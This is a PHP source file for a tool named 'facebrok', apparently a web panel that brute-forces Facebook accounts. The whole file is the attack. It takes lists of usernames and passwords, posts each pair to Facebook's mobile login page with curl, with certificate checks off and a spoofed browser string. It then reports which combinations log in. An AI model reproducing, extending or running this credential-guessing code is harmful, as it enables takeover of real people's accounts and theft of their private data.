<?php
// facebrok 
// Brute force, Attack.
session_start();
error_reporting(0);
if($_SESSION['user']){
include ("config.php");
?>
<!--
 ______
 | ___|
 | |_____________________  ___ _______  __
 |  ______ | ___|  __ | |__| |/ /_ | | / /
 | || |  | | |  | ____| __ | | / | | |/ /
 | || |__| | |__| |___||_| |  /|_| |   |
 |_||____,,|____|_____|____|__|____|_|\_\
        one tool awesome for you.
-->
<title>facebrok - cracking</title>
<link rel="shortcut icon" href="facebook.png" />
<link href="minify.css" rel="stylesheet" type="text/css"/>
<link href="login.css " rel="stylesheet" type="text/css"/>
<body class="login">
<style type="text/css" media="screen"><!--a:link   {text-decoration:none;}   --></style>
<div class="content">
<h4 class="form-title" title="methods"><center>Attack<center></h4>
<div id="a">

<?php

function brute($user,$pass){
	$ch = curl_init();      
	curl_setopt($ch, CURLOPT_URL, "https://m.facebook.com/login.php?login_attempt=1");
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_POSTFIELDS, "email={$user}&pass={$pass}");
	curl_setopt($ch, CURLOPT_USERAGENT, "Chrome/36.0.1985.125"); 
	$login = curl_exec($ch);
	$check = (eregi('class="s t i u"',$login)) ? true:false;
	if($check == true){
		echo "No  || Username : <font color='red'>$user</font>&nbsp;  Password : <font color='red'>$pass</font></font></p>";
	}else{
		echo "yes || Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
	}
}  

	$username = explode("\n", $_POST['username']);
	$password = explode("\n", $_POST['password']);
	
	
foreach($username as $users) {
	$users = @trim($users);
	foreach($password as $pass) {
		$pass = @trim($pass);
		echo brute($users,$pass);
	}
 
}
 



} else {header("location:../croak");} ?>